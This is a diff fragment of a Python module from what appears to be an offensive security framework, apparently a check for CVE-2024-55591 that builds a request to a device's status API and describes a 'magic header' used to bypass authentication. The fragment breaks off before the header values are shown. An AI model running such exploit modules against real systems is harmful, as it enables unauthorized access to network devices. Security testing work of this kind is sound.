@@ -1,25 +1,18 @@
+# MIT License.
 # Copyright (c) 2026 Storm Framework
 
-# Licensed under the MIT License.
+# See LICENSE file in the project root for full license information.
 
-See LICENSE file in the project root for full license information.
 
 import requests
 import urllib3
-
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 REQUIRED_OPTIONS = {"URL": ""}
-
-
 def execute(options):
-
     target = options.get("URL")
     port = 443
-
     print(f"[*] Testing CVE-2024-55591 on https://{target}:{port}")
-
     url = f"https://{target}:{port}/api/v2/monitor/system/status"
-
     # 'Magic Header' which leaks authentication
     # The attacker manipulates the header to make Node.js think the user is logged in.
     headers = {
